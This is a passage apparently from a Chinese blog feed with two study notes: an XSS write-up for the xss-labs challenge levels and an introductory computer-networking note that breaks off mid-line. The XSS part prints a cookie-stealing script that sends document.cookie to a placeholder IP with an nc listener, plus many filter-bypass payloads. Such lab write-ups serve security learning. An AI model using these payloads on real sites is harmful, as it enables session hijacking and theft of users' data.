class="line">Cookie盗取：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">"img"</span>);img.src=<span class="string">"http://xxx.xxx.xxx.xxx:1234/a?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">nc监听端口1234</span><br></pre></td></tr></table></figure><h1 id="xss编码"><a href="#xss编码" class="headerlink" title="xss编码"></a>xss编码</h1><h2 id="js编码"><a href="#js编码" class="headerlink" title="js编码"></a>js编码</h2><p>JS提供了四种字符编码的策略，</p><ul><li>三个八进制数字，如果数字不够，在前面补零，如a的编码为<code>\141</code></li><li>两个十六进制数字，如果数字不够，在前面补零，如a的编码为<code>\x61</code></li><li>四个十六进制数字，如果数字不够，在前面补零，如a的编码为<code>\u0061</code></li><li>对于一些控制字符，使用特殊的C类型的转义风格，如<code>\n</code>和<code>\r</code></li></ul><h2 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h2><p><strong>命名实体</strong><br>以<code>&amp;</code>开头，以分号结尾的，如<code>&lt;</code>的编码为<code>&amp;1t;</code></p><p><strong>字符编码</strong></p><p>十进制，十六进制的ASCII码或者Unicode字符编码。样式为<code>&amp;#</code>数值;</p><p>如<code>&lt;</code>的编码为</p><p><code>&lt;</code>(10进制)&amp;#60</p><p><code>&lt;</code>(16进制)&amp;#x003c</p><p><strong>URL编码</strong></p><p>这里为url全编码，也就是两次url编码</p><p>如alert的url全编码<code>为%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34</code></p><p><strong>String.fromCharCode编码</strong></p><p>如alert的编码为<code>String.fromCharCode(97,108,101,114,116)</code></p><h1 id="xss挑战题"><a href="#xss挑战题" class="headerlink" title="xss挑战题"></a>xss挑战题</h1><p>做任何题都可以测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&quot;script on alert()&quot; href&gt;</span><br></pre></td></tr></table></figure><p>做一下xss题</p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><img src="/2020/12/09/xss/image-20200821200652133.png" alt="image-20200821200652133"></p><p>可以发现test在h2标签处，直接写就可以只需要弹窗，就可以进入下一关</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;test&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><img src="/2020/12/09/xss/image-20200821201141420.png" alt="image-20200821201141420"></p><p><img src="/2020/12/09/xss/image-20200821201207838.png" alt="image-20200821201207838"></p><p>对比可以发现，值直接在value处，所以<strong>只需要闭合标签即可</strong></p><p><strong>搜索框里直接写</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>同时还有其他方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">需要鼠标划过输入框</span><br><span class="line">&quot; onmouseover&#x3D;alert(1)&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">需要点击搜索框</span><br><span class="line">&quot; onclick&#x3D;alert(1) &gt;</span><br><span class="line">&quot; onclick&#x3D;alert(1) &quot;</span><br></pre></td></tr></table></figure><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>这关进行了实体转义，<strong>也就是过滤了&lt;&gt;和””,</strong>所以我们可以利用单引号和注释符</p><p>其中转义函数<img src="/2020/12/09/xss/image-20200821203827654.png" alt="image-20200821203827654"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;alert(1)&#x2F;&#x2F;</span><br><span class="line">&#39; onmouseover&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>和上一关一样，但需要注意的是<strong>双引号</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick&#x3D;alert(1) &quot;</span><br><span class="line">&quot; onclick&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class="line">&quot; onfocus&#x3D;alert(1) autofocus&#x3D;&quot;</span><br><span class="line">&quot; onfocus&#x3D;alert(1) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>这个关卡过滤了on，但没有过滤单双引号，<strong>所以可以用伪协议</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;111&lt;&#x2F;a&gt; &#x2F;&#x2F;</span><br><span class="line">&quot;&gt;&lt;iframe src&#x3D;javascript:alert(1)&gt;</span><br><span class="line">&quot;&gt;&lt;iframe src&#x3D;javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>script 转换成 scr_ipt        on 转换成 o_n        src 转换成 sr_c        data 转换成 da_ta        href 转换成 hr_ef</p><p><strong>但可以大小写绕过</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;Script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">&quot;&gt; &lt;a Href&#x3D;&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&quot; Onclick&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class="line">&quot; Onclick&#x3D;alert(1) &quot;</span><br></pre></td></tr></table></figure><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>过滤了script，on，href</p><p><strong>所以可以双写绕过</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hrhrefef&#x3D;&quot;javascriscriptpt:alert(1)&quot;&gt;111&lt;&#x2F;a&gt;&#x2F;&#x2F;</span><br><span class="line">&quot;&gt;&lt;scriscriptpt&gt;alert(1)&lt;&#x2F;scriscriptpt&gt;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>script,on，src，data，href，大小写失效，”被编码所以value处几乎找不到</p><p>但下面链接处可以看到 &lt;&gt; ‘ % # &amp; 未被过滤 看了别人题解之后是<strong>html实体编码绕过</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1)</span><br><span class="line">javasc&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</span><br></pre></td></tr></table></figure><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>不了解，去看了源码是<strong>得加http://</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)&#x2F;&#x2F;http:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>这真想不出来</p><p>试了三个参数，发现只有最后一个可以写入，<strong>直接构造</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; type&#x3D;text onmouseover&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class="line">&quot; type&#x3D;image src&#x3D;1 onerror&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>这个题应该是抓包看，但由于我是谷歌做题，火狐抓包，导致每次直接复制11题url它都不会直接抓到ref头，正确应该是在10题向11题跳转时抓包。</p><p><img src="/2020/12/09/xss/image-20200822205648946.png" alt="image-20200822205648946"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover&#x3D;alert(1) type&#x3D;&#39;text&#39;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>把ref头改成这个，发包即可</p><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>有了上一个题的提示，这个题就明显很多了</p><p>只要改一下UA头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0&quot; onmouseover&#x3D;alert(1) type&#x3D;&quot;text&quot; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>这个应该是改cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__cfduid&#x3D;d0d48515569060ded9a058127e163bb661598095904;user&#x3D;&quot; onmouseover&#x3D;alert(1) type&#x3D;&quot;text&quot; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>链接好像是挂掉了，但好像是没有太看懂，回头再来看一下</p><h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>看源码发现</p><p><img src="/2020/12/09/xss/image-20200822213204305.png" alt="image-20200822213204305"></p><p>然后上网查一下</p><p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件。</p><p>包含的内容将作为指定元素的子节点。</p><p><code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。</p><p>默认情况下，包含的文件需要包含在<strong>同一个域名</strong>下。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src&#x3D;&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;&lt;span class&#x3D;&quot;ng-include:&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure><p>也就是说src包含的内容会进入ng-include被包含</p><p>那我们可以想出能不能直接闭合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src&#x3D;&quot;&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><p>但发现直接被转义了，所以还是不行，只能包含第一关代码</p><h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><p>这个题是把空格过滤了</p><p>用%0d和%0a绕过</p><p><strong>%0a换行符号”\n”<br>%0d回车符号”\r”</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0Dsrc&#x3D;1%0Donerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;img%0asrc&#x3D;1%0aonerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><p>就找源码和url之间的关系</p><p>可以看见在src处有不同</p><p>&lt;&gt;被过滤，考虑on事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg02&#x3D; onmouseover&#x3D;alert(1)</span><br></pre></td></tr></table></figure><h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><p>和17关一样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01&#x3D;a%20&amp;arg02&#x3D;b onmouseover&#x3D;alert(1)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- 反引号代替圆括号</span><br><span class="line">- 换行绕过正则</span><br><span class="line">- &lt;!--不仅可以用--&gt;,也可以用--!&gt;闭合</span><br><span class="line">- &#x2F;&#x2F;可以用换行来绕过</span><br><span class="line">- &lt;!--和--&gt;都可以在html的script标签里单独使用进行单行注释</span><br><span class="line">- ſ 符号转换为大写后正好为大写字母 S</span><br><span class="line">- 可以用 %0a 代替空格进行绕过</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这篇更乱，也就那个小挑战还算完整&lt;/p&gt;
&lt;h1 id=&quot;XSS&quot;&gt;&lt;a href=&quot;#XSS&quot; class=&quot;headerlink&quot; title=&quot;XSS&quot;&gt;&lt;/a&gt;XSS&lt;/h1&gt;&lt;h2 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="web" scheme="https://pz1o.top/categories/web/"/>
    
    
    <category term="web" scheme="https://pz1o.top/tags/web/"/>
    
    <category term="xss" scheme="https://pz1o.top/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>计网</title>
    <link href="https://pz1o.top/2020/12/09/%E8%AE%A1%E7%BD%91/"/>
    <id>https://pz1o.top/2020/12/09/%E8%AE%A1%E7%BD%91/</id>
    <published>2020-12-09T15:29:40.000Z</published>
    <updated>2020-12-09T15:32:12.091Z</updated>
    
    <content type="html"><![CDATA[<p>这个只有这一部分了</p><p>后面学了但好像丢了</p><p>看多会学到计网时，再来补这一篇</p><h1 id="计网初学"><a href="#计网初学" class="headerlink" title="计网初学"></a>计网初学</h1><h2 id="TCP-IP分层模型"><a href="#TCP-IP分层模型" class="headerlink" title="TCP/IP分层模型"></a><strong>TCP/IP分层模型</strong></h2><div class="table-container"><table><thead><tr><th>应用层（第五层)</th></tr></thead><tbody><tr><td><strong>传输层（第四层）</strong></td></tr><tr><td><strong>互联网层（第三层）</strong></td></tr><tr><td><strong>网路接口层（第二层）</strong></td></tr><tr><td><strong>物理层（第一层）</strong></td></tr></tbody></table></div><p>物理层：对应于网络的基本硬件，即我们可以看得见的硬件设备。</p><p>网络接口层：定义了将数据组成正确帧的规程和在网络中传输帧的规程。</p><p>互联网层：本层定义了互联网中传输的信息包的格式，以及从一个用户通过一个或多个路由器到最终目标的信息包转发机制。</p><p>传输层：为两个用户进程之间建立，管理和拆除可靠而又有效的端到端的连接。</p><p>应用层：定义了应用程序使用互联网的规程。</p><h2 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h2><p>ip地址分为两部分：网络标识和主机标识</p><p>网络标识：用以标明具体的网络段</p><p>主机标识：某个网络中待定的计算机号码</p><p>网络标识：210.73.140.0</p><p>主机标识：                    2</p><p>合起来写：210.73.140.2</p><p>人们按照网络规模的大小，把32为地址信息设成3种定位的划分方式，三种划分方法分别对应于A，B，C类IP地址，IP地址分为网络号和主机号两部分</p><p>（1）A类IP地址（1-126）</p><p>该地址由1字节网络地址和3字节主机地址组成，网络地址最高位必须是0。</p><p>（2）B类IP地址（128-191）</p><p>该地址由2字节网络地址和2字节主机地址组成，网络地址最高位必须是10。</p><p>（3）C类IP地址（192-223）</p><p>该地址由3字节网络地址和1字节主机地址组成，网络地址最高位必须是110。</p><p>（4）D类IP地址（224-239）</p><p>多点广播地址，用于IP组播。</p><p>（5）E类IP地址（240-225）</p><p>保留地址，用作特殊用途。</p><p>（0.0.0.0）对应当前主机，（255.255.255.255）是当前子网的传播地址。</p><h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p>顶级域名 .com</p><p>二级域名 test.com</p><p>三级域名 test.cn.com</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609213455144.png" alt="image-20200609213455144"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609214339970.png" alt="image-20200609214339970"></p><h2 id="DNS服务器"><a href="#DNS服务器" class="headerlink" title="DNS服务器"></a>DNS服务器</h2><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609214938548.png" alt="image-20200609214938548"></p><h1 id="计网学习"><a href="#计网学习" class="headerlink" title="计网学习"></a>计网学习</h1><h2 id="第一章-计算机网络概述"><a href="#第一章-计算机网络概述" class="headerlink" title="第一章 计算机网络概述"></a>第一章 计算机网络概述</h2><p>局域网：覆盖范围小  自己花钱买设备  带宽固定</p><p>广域网：距离远 花钱买服务</p><p>Internet ：有自己的机房  对网民提供连接。</p><p>IP地址：网络中的地址。</p><p>物理地址：Mac地址，电脑出厂时已固定。</p><p>网关：下图中的G就是网关，相当于网络中的一个关卡。网关地址为G的IP地址。</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609224145835.png" alt="image-20200609224145835"></p><div class="table-container"><table><thead><tr><th>本机ip</th><th>访问ip</th><th>本机mac</th><th>下次访问mac</th></tr></thead><tbody><tr><td>15.0.0.2</td><td>13.0.0.2</td><td>m4</td><td>m5</td></tr></tbody></table></div><p><strong>OSI参考模型</strong></p><ul><li>应用层：能产生网络流量的程序</li><li>表示层：在传输之前是否加密或压缩处理</li><li>会话层：查正在进行会话的程序 netstat -nb</li><li>传输层：可靠传输（TCP）和流量控制 不可靠传输（UDP）</li><li>网络层：选择最佳路径 规划IP地址</li><li>数据链路层：帧的开始和结束。差错检查。</li><li>物理层：接口标准和电器标准</li></ul><p><strong>OSI参考模型网络排错指导</strong></p><ol><li>物理层故障：查看连接状态，发送和接受的数据包</li><li>数据链路层：MAC地址冲突、网速协商不一致、计算机VLAN错误</li><li>网络层故障：配置错误的IP地址 子网掩码和错误的网关</li><li>应用层故障：应用错误代理。</li></ol><p>检查网络是否通畅：ping一个网址</p><p><strong>OSI参考模型和网络安全</strong></p><ol><li>物理层安全</li><li>数据链路层安全：登录需要账号和密码</li><li>网络层安全：路由器限制数据包流量</li><li>应用层安全：开发程序有没有漏洞<img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200610122326325.png" alt="image-20200610122326325"></li></ol><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200610122957433.png" alt="image-20200610122957433"></p><h2 id="第二章-物理层"><a href="#第二章-物理层" class="headerlink" title="第二章 物理层"></a>第二章 物理层</h2><h3 id="0x01物理层的基本概念"><a href="#0x01物理层的基本概念" class="headerlink" title="0x01物理层的基本概念"></a>0x01物理层的基本概念</h3><p>物理层解决如何连接在各种计算机的<strong>传输媒体上</strong>传输<strong>数据比特流</strong>，不是指具体的传输媒体。</p><p>物理层主要是确定传输媒体的接口的一些特性。有机械，电器，功能，过程特性。</p><h3 id="0x02数据通信知识"><a href="#0x02数据通信知识" class="headerlink" title="0x02数据通信知识"></a>0x02数据通信知识</h3><p><strong>数据通信模型</strong>：</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611101252348.png" alt="image-20200611101252348"></p><p>数据：运送消息的实体。</p><p>信号：数据电气或电磁的表现。</p><p>信道：表示一个方向传送信息的媒体。</p><p>单向通信，双向交替通信，双向同时通信。</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611103259080.png" alt="image-20200611103259080"></p><h3 id="0x03物理层下面的传输媒体"><a href="#0x03物理层下面的传输媒体" class="headerlink" title="0x03物理层下面的传输媒体"></a>0x03物理层下面的传输媒体</h3><p>无屏蔽双绞线UTP</p><p>屏蔽双绞线STP</p><p>同轴电缆</p><p>光纤</p><p>微波传输</p><p>物理层设备—集线器</p><h3 id="0x04信道复用技术"><a href="#0x04信道复用技术" class="headerlink" title="0x04信道复用技术"></a>0x04信道复用技术</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611121924344.png" alt="image-20200611121924344"></p><h3 id="0x05数字传输系统"><a href="#0x05数字传输系统" class="headerlink" title="0x05数字传输系统"></a>0x05数字传输系统</h3><h3 id="0x06宽带接入技术"><a href="#0x06宽带接入技术" class="headerlink" title="0x06宽带接入技术"></a>0x06宽带接入技术</h3><p>ADSL</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611122852820.png" alt="image-20200611122852820"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123214486.png" alt="image-20200611123214486"></p><p>光纤</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123435591.png" alt="image-20200611123435591"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123546821.png" alt="image-20200611123546821"></p><h2 id="第三章数据链路层"><a href="#第三章数据链路层" class="headerlink" title="第三章数据链路层"></a>第三章数据链路层</h2><h3 id="0x01数据链路层基本概念"><a href="#0x01数据链路层基本概念" class="headerlink" title="0x01数据链路层基本概念"></a>0x01数据链路层基本概念</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615185534103.png" alt="image-20200615185534103"></p><p>数据链路层信道类型：点到点和广播。</p><p>链路：是一条点到点的物理线路段。</p><p>数据链路：除了物理线路外，还必须有通信协议来控制这些数据的传输。</p><p>帧：帧头 帧尾 mac地址 校验码</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615190949900.png" alt="image-20200615190949900"></p><h3 id="0x02数据链路层的三个基本问题"><a href="#0x02数据链路层的三个基本问题" class="headerlink" title="0x02数据链路层的三个基本问题"></a>0x02数据链路层的三个基本问题</h3><p>1.封装成帧</p><p>2.透明传输（将转义字符转义）</p><p>3.差错控制</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615194723467.png" alt="image-20200615194723467"></p><p>传的数据为<strong>101001001</strong>/1101余数为0就会接受。</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195101214.png" alt="image-20200615195101214"></p><h3 id="0x03两种情况下的数据链路层"><a href="#0x03两种情况下的数据链路层" class="headerlink" title="0x03两种情况下的数据链路层"></a>0x03两种情况下的数据链路层</h3><p><strong>点到点信道的数据链路层</strong>（广域网）</p><p>PPP协议</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195355465.png" alt="image-20200615195355465"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615201603443.png" alt="image-20200615201603443"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195843590.png" alt="image-20200615195843590"></p><p><strong>广播信道的数据链路层</strong>（集线器）</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615205445679.png" alt="image-20200615205445679"></p><h3 id="0x04以太网"><a href="#0x04以太网" class="headerlink" title="0x04以太网"></a>0x04以太网</h3><p>以太网是一种CSMA/CD的局域网</p><p><strong>媒体接入控制层</strong>（MAC ）</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615211139871.png" alt="image-20200615211139871"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615211817436.png" alt="image-20200615211817436"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615212131635.png" alt="image-20200615212131635"></p><p>FCS抓包之后会删掉。</p><h3 id="0x05扩展以太网"><a href="#0x05扩展以太网" class="headerlink" title="0x05扩展以太网"></a>0x05扩展以太网</h3><p>集线器级联，会使网络中计算机数量增加，但会使冲突域增大，如何优化呢？</p><p><strong>网桥</strong><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615214530777.png" alt="image-20200615214530777"></p><p>网桥就是交换机的前身，交换机相当于网桥和集线器。</p><h3 id="0x06高速以太网"><a href="#0x06高速以太网" class="headerlink" title="0x06高速以太网"></a>0x06高速以太网</h3><h2 id="第四章-网络层"><a href="#第四章-网络层" class="headerlink" title="第四章 网络层"></a>第四章 网络层</h2><h3 id="0x01网络层提供的服务"><a href="#0x01网络层提供的服务" class="headerlink" title="0x01网络层提供的服务"></a>0x01网络层提供的服务</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616110826298.png" alt="image-20200616110826298"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616111607056.png" alt="image-20200616111607056"></p><p>（路由器是网络层设备）</p><p>网络地址相同就可以看成一个<strong>网段</strong>，怎么看网络地址呢？可以看子网掩码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ip:10.0.0.1</span><br><span class="line">子网掩码:255.0.0.0</span><br><span class="line">&#x2F;&#x2F;此时，我们可以看出子网掩码是255，那表明ip地址中10就是网络地址。</span><br><span class="line"></span><br><span class="line">ip:12.0.0.1</span><br><span class="line">子网掩码255.255.0.0</span><br><span class="line">&#x2F;&#x2F;255.255.0.0说明在这个网段中12.0是网络地址</span><br><span class="line"></span><br><span class="line">网关：路由器上配置，一般为该网段中的第一个地址，实际上任意一个地址都可以。</span><br><span class="line"></span><br><span class="line">路由器：路由器是无法知道它具体网段的位置，需要添加路由表。</span><br></pre></td></tr></table></figure><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616114228562.png" alt="image-20200616114228562"></p><h3 id="0x02网络设备和OSI参考模型"><a href="#0x02网络设备和OSI参考模型" class="headerlink" title="0x02网络设备和OSI参考模型"></a>0x02网络设备和OSI参考模型</h3><p>发送端：</p><ol><li><p>应用层 程序准备要传输的文件</p></li><li><p>传输层 将文件编号</p></li><li><p>网络层 添加IP地址</p></li><li><p>数据链路层  有两种情况 </p><p>第一种 通过子网掩码 ，判断是否是同一个网段。如果是，利用ARP协议广播解析目标ip地址的MAC地址</p><p>第二种</p></li></ol><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200617112108377.png" alt="image-20200617112108377"></p><h3 id="0x03网络层协议"><a href="#0x03网络层协议" class="headerlink" title="0x03网络层协议"></a>0x03网络层协议</h3><h4 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a><strong>ARP协议</strong></h4><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200617113421057.png" alt="image-20200617113421057"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp -a  &#x2F;&#x2F;查询mac地址</span><br><span class="line">arp -s ip地址 mac地址   &#x2F;&#x2F;配置IP地址的MAC地址</span><br></pre></td></tr></table></figure><p>arp协议:将ip地址通过广播 目标MAC地址是FF-FF-FF-FF-FF-FF<strong>解析目标ip地址的MAC地址</strong></p><p>arp欺骗: 数据链路层故障，缓存了错误的MAC地址</p><h4 id="网际控制报文协议（ICMP）"><a href="#网际控制报文协议（ICMP）" class="headerlink" title="网际控制报文协议（ICMP）"></a><strong>网际控制报文协议</strong>（ICMP）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ping      ttl&#x3D;64 linux</span><br><span class="line">128 windows</span><br><span class="line">255 unix</span><br><span class="line">ping www.baidu.com -t    一直ping</span><br><span class="line">ping www.baidu.com -l 200   定义数据包的大小</span><br><span class="line">&#x2F;&#x2F;查看路由器的地址</span><br><span class="line">ping 8.8.8.8 -i 1 更改数据包ttl时间，可以跟踪途经的路由器</span><br><span class="line">pathping   跟踪ping的路径</span><br><span class="line">tracert    直接跟踪路由</span><br></pre></td></tr></table></figure><h4 id="IGMP"><a href="#IGMP" class="headerlink" title="IGMP"></a>IGMP</h4><p>配置在路由器上扫描多播地址的协议</p><p>广播：目标ip地址是全ff，目标mac地址是255，向局域网内所有计算机发出广播</p><p>点到点：从一个点到另一个点</p><p>组播：一对多</p><h3 id="0x04数据包"><a href="#0x04数据包" class="headerlink" title="0x04数据包"></a>0x04数据包</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619111139014.png" alt="image-20200619111139014"></p><p>版本：用来表示TCP/IP协议的版本 v4 v6</p><p>区分服务：看谁的优先级高</p><p>标识：100 100 